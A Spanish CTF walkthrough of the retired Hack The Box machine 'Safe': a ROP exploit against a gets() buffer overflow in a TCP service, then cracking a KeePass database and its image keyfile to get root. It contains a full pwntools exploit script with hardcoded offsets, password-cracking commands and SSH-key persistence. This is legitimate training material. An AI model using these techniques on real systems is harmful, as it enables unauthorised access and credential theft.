---
machine: Safe
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, pwn, rop, buffer-overflow, keepass, privesc]
---

# Safe — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El puerto `1337` ejecuta `myapp`, un binario ELF de 64 bits que llama a `uptime`, pide una cadena con `gets` y la imprime con `puts`. `gets` desborda un buffer de `0x70` bytes; el offset hasta RIP es 120. Sin canary ni PIE y con NX activo, un ROP filtra la dirección de `puts` desde la GOT, calcula la base de libc y llama a `system("/bin/sh")`. La shell es de `user`. Su home contiene un KeePass `MyPasswords.kdbx`; una de las imágenes JPG es keyfile. Al crackear el master password y abrir la base con `kpcli` aparece la contraseña de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,1337 <IP>
```

- `22` OpenSSH 7.4p1 Debian 9.
- `80` Apache 2.4.25; la página por defecto tiene un comentario que apunta a `/myapp`.
- `1337` devuelve el `uptime` y el prompt `What do you want me to echo back?`.

```bash
wget http://<IP>/myapp
file myapp
checksec --file=myapp
```

`myapp` es un ELF `x86-64`, dinámico, no stripped. `checksec` muestra NX activo, sin canary y sin PIE.

## Enumeración

El servicio escucha en `1337` y reenvía stdin/stdout al binario. En `gdb` se confirma que `main` hace:

```text
system("uptime")
printf("What do you want me to echo back? ")
gets(buffer)   ; buffer en rbp-0x70
puts(buffer)
```

Con un patrón cíclico, el offset hasta el valor que se carga en RIP es 120. La función `system@plt` ya está importada, y `pop rdi; ret` está en `0x40120b`.

## Foothold

La primera etapa filtra `puts@got` llamando a `system(puts@got)` y vuelve a `main`:

```python
payload = b"A"*120 + p64(pop_rdi) + p64(puts_got) + p64(system_plt) + p64(main)
```

La salida incluye la dirección de `puts` y el error `not found`. Con la base de libc se calcula `/bin/sh` y se envía la segunda etapa:

```python
payload = b"A"*120 + p64(pop_rdi) + p64(binsh) + p64(system_plt)
```

El script con `pwntools` obtiene una shell como `user`:

```python
from pwn import *
context(os="linux", arch="amd64")
p = remote("<IP>", 1337)
p.recvline()
p.sendline(b"A"*120 + p64(0x40120b) + p64(0x404018) + p64(0x401040) + p64(0x40115f))
leak = u64(p.recvline().strip()[7:-11].ljust(8, b"\x00"))
libc_base = leak - 0x68f90
p.recvline()
p.sendline(b"A"*120 + p64(0x40120b) + p64(libc_base + 0x161c19) + p64(0x401040))
p.interactive()
```

También se puede escribir `/bin/sh` en `.data` con `gets` o usar la función `test()` no llamada; las tres variantes ejecutan `system`.

## Movimiento lateral

No hay pivote. La shell inicial es de `user`; se puede estabilizar escribiendo una clave SSH en `~/.ssh/authorized_keys`.

## Escalada de privilegios

En la home hay un KeePass y seis fotos:

```bash
scp user@<IP>:~/MyPasswords.kdbx .
scp user@<IP>:~/IMG_*.JPG .
```

`keepass2john` genera un hash por cada posible keyfile; `john` con `rockyou-30` recupera el master password. Se prueba cada imagen hasta que `kpcli` abre la base:

```bash
keepass2john MyPasswords.kdbx > hashes
for img in IMG_*.JPG; do keepass2john -k "$img" MyPasswords.kdbx; done >> hashes
john hashes --wordlist=rockyou-30.txt
kpcli --key IMG_0547.JPG --kdb MyPasswords.kdbx
```

Dentro de `MyPasswords` hay una entrada `Root password`. Esa contraseña funciona con `su -` y da una shell de root.

## Evidencia

- `myapp` con `gets`, sin canary y sin PIE.
- Crash con offset 120 y dirección de `puts` filtrada.
- Shell como `user`.
- `MyPasswords.kdbx` y las imágenes; una abre la base.
- Entrada `Root password` y `id` con UID 0.

## Lecciones aprendidas

- Un servicio TCP puede ser un binario vulnerable proxificado, no un servidor HTTP.
- `gets` sin canary y sin PIE convierte un fallo de entrada en un ROP fiable.
- Filtrar una función de la GOT es suficiente para derrotar ASLR con la libc correcta.
- Un gestor de contraseñas solo es tan fuerte como su master password y su keyfile.

## Mitigaciones y detección

- Sustituir `gets` por `fgets` con límite y compilar con canary, PIE y RELRO completo.
- No exponer binarios de práctica en producción; menos aún con setuid o como servicio.
- Usar master passwords fuertes y keyfiles que no se almacenen junto a la base.
- Restringir la lectura de la home y rotar la contraseña de root.
- Detectar patrones largos en `1337`, caídas del servicio y ejecución de `system` desde `myapp`.

## Referencias

- [0xdf — Safe](https://0xdf.gitlab.io/2019/10/26/htb-safe.html)
- [IppSec — Safe](https://www.youtube.com/watch?v=CO_g3wtC7rk)
- [Hack The Box — Safe](https://app.hackthebox.com/machines/safe)
